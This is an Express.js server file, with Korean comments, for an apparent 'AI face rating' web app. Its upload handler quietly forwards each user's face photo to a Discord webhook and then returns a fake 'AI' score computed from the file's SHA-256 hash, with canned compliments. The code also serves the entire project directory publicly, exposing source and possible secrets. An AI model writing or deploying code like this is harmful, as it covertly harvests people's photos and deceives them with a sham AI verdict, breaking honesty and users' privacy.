import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import crypto from "crypto";
import FormData from "form-data";

const app = express();
const PORT = process.env.PORT || 10000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// 업로드 디렉터리 준비
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
const upload = multer({ dest: uploadDir });

// 업로드 폴더를 정적파일로 서빙 (이미지 외부 접근 가능)
app.use('/uploads', express.static(path.resolve(uploadDir)));

app.use(express.static("./"));

app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;
  const fileName = path.basename(filePath);

  // 외부 접근 가능한 URL 만들기
  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
  const publicUrl = `${baseUrl}/uploads/${fileName}`;

  try {
    if (!DISCORD_WEBHOOK_URL) {
      throw new Error("DISCORD_WEBHOOK_URL 환경변수가 설정되어 있지 않습니다.");
    }

    // 디스코드 임베드 메시지에 외부 URL 이미지 넣기
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), { filename: fileName });

    const payload = {
      content: "새 얼굴 평가가 도착했어요!",
      embeds: [
        {
          title: "AI 얼굴 평가 결과",
          image: { url: publicUrl },
          color: 5814783,
          footer: { text: "Face Review Bot" }
        }
      ]
    };

    form.append("payload_json", JSON.stringify(payload));

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders()
    });

    console.log("디스코드 전송 성공");
  } catch (e) {
    console.error("디스코드 전송 실패:", e);
  }

  // 얼굴 점수 계산
  try {
    const buffer = fs.readFileSync(filePath);
    const hash = crypto.createHash("sha256").update(buffer).digest("hex");
    const base = parseInt(hash.slice(0, 8), 16);

    const score = Math.round((5 + (base % 50) / 10) * 10) / 10;
    const percent = Math.max(1, 100 - Math.round((score / 10) * 100));

    let feedback = "";
    if (percent <= 5) feedback = "연예인급 외모입니다.";
    else if (percent <= 10) feedback = "상위권 외모로 매우 눈에 띕니다.";
    else if (percent <= 20) feedback = "호감도가 높은 얼굴입니다.";
    else if (percent <= 40) feedback = "평균 이상으로 안정적인 인상입니다.";
    else feedback = "개성이 느껴지는 얼굴입니다.";

    res.json({ score, percent, feedback });
  } catch (e) {
    console.error("평가 점수 계산 중 에러:", e);
    res.status(500).json({ error: "평가 중 오류가 발생했습니다." });
  } finally {
    fs.unlink(filePath, (err) => {
      if (err) console.error("업로드 파일 삭제 실패:", err);
    });
  }
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
